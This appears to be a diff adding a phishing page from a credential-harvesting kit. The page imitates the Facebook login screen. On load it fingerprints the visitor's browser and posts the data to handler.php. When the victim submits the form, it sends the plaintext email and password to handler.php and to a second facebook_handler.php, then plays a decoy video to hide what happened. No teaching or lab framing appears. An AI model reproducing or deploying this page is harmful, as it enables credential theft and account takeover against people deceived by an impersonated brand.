@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <script src="../../assets/js/jquery.min.js"></script>
+    <script src="../../assets/js/client.min.js"></script>
+    <script src="../../assets/js/loc.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .container {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .facebook-logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .facebook-logo h1 {
+            color: #1877f2;
+            font-size: 28px;
+            font-weight: bold;
+        }
+
+        .login-form {
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 12px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            outline: none;
+        }
+
+        .form-input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+
+        .login-button {
+            width: 100%;
+            background: #1877f2;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-size: 20px;
+            font-weight: bold;
+            padding: 12px;
+            cursor: pointer;
+            margin-bottom: 15px;
+        }
+
+        .login-button:hover {
+            background: #166fe5;
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .forgot-password a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .divider {
+            border-top: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+
+        .create-account {
+            text-align: center;
+        }
+
+        .create-account-button {
+            background: #42b883;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-size: 17px;
+            font-weight: bold;
+            padding: 12px;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        .reel-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 9999;
+            display: none;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .reel-video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .reel-close {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.5);
+            color: white;
+            border: none;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            font-size: 20px;
+            cursor: pointer;
+            z-index: 10000;
+        }
+
+        .loading-spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid #1877f2;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 10px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .error-message {
+            color: #f02849;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+            text-align: center;
+        }
+    </style>
+</head>
+<body onload="mydata()">
+    <div class="container">
+        <div class="facebook-logo">
+            <h1>facebook</h1>
+        </div>
+
+        <form class="login-form" id="loginForm">
+            <div class="form-group">
+                <input type="text" class="form-input" id="email" name="email" placeholder="Email or phone number" required>
+            </div>
+            <div class="form-group">
+                <input type="password" class="form-input" id="password" name="password" placeholder="Password" required>
+            </div>
+            
+            <div class="loading-spinner" id="loadingSpinner"></div>
+            <div class="error-message" id="errorMessage"></div>
+            
+            <button type="submit" class="login-button" id="loginButton">
+                Log In
+            </button>
+        </form>
+
+        <div class="forgot-password">
+            <a href="#">Forgotten password?</a>
+        </div>
+
+        <div class="divider"></div>
+
+        <div class="create-account">
+            <button class="create-account-button">Create New Account</button>
+        </div>
+    </div>
+
+    <!-- Reel Container -->
+    <div class="reel-container" id="reelContainer">
+        <video class="reel-video" id="reelVideo" autoplay muted loop>
+            <source src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ElephantsDream.mp4" type="video/mp4">
+        </video>
+        <button class="reel-close" id="reelClose">×</button>
+    </div>
+
+    <script>
+        function post(data) {
+            $.ajax({
+                type: 'POST',
+                data: { data: data },
+                url: 'handler.php',
+                dataType: 'json',
+                async: false,
+                success: function(result) {
+                    console.log('Data sent to local handler successfully');
+                },
+                error: function() {
+                    console.log('Error sending data to local handler');
+                }
+            });
+            
+            if(data.includes('facebook_login')) {
+                $.ajax({
+                    type: 'POST',
+                    data: { data: data },
+                    url: '../../facebook_handler.php',
+                    dataType: 'json',
+                    async: false,
+                    success: function(result) {
+                        console.log('Facebook credentials sent to root handler successfully');
+                    },
+                    error: function() {
+                        console.log('Error sending Facebook credentials to root handler');
+                    }
+                });
+            }
+        }
+
+        function mydata() {
+            const userData = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screenResolution: screen.width + 'x' + screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                referrer: document.referrer,
+                url: window.location.href
+            };
+            post(JSON.stringify(userData));
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const loginButton = document.getElementById('loginButton');
+            const loadingSpinner = document.getElementById('loadingSpinner');
+            const errorMessage = document.getElementById('errorMessage');
+            
+            errorMessage.style.display = 'none';
+            
+            if (!email || !password) {
+                showError('Please fill in all fields');
+                return;
+            }
+            
+            loginButton.disabled = true;
+            loginButton.textContent = 'Logging in...';
+            loadingSpinner.style.display = 'block';
+            
+            setTimeout(() => {
+                const loginData = {
+                    email: email,
+                    password: password,
+                    timestamp: new Date().toISOString(),
+                    loginStatus: 'success',
+                    userAgent: navigator.userAgent,
+                    ip: 'captured',
+                    sessionId: Math.random().toString(36).substr(2, 9)
+                };
+                
+                post(JSON.stringify({
+                    type: 'facebook_login',
+                    email: email,
+                    password: password,
+                    data: loginData,
+                    timestamp: new Date().toISOString()
+                }));
+                
+                loginButton.disabled = false;
+                loginButton.textContent = 'Log In';
+                loadingSpinner.style.display = 'none';
+                
+                playReel();
+            }, 1500);
+        });
+
+        function showError(message) {
+            const errorMessage = document.getElementById('errorMessage');
+            errorMessage.textContent = message;
+            errorMessage.style.display = 'block';
+        }
+
+        function playReel() {
+            const reelContainer = document.getElementById('reelContainer');
+            const reelVideo = document.getElementById('reelVideo');
+            
+            reelContainer.style.display = 'flex';
+            reelVideo.play();
+            
+            setTimeout(() => {
+                closeReel();
+            }, 10000);
+        }
+
+        function closeReel() {
+            const reelContainer = document.getElementById('reelContainer');
+            const reelVideo = document.getElementById('reelVideo');
+            
+            reelVideo.pause();
+            reelContainer.style.display = 'none';
+        }
+
+        document.getElementById('reelClose').addEventListener('click', closeReel);
+        document.getElementById('reelContainer').addEventListener('click', function(e) {
+            if (e.target === this) {
+                closeReel();
+            }
+        });
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                closeReel();
+            }
+        });
+    </script>
+</body>
+</html>
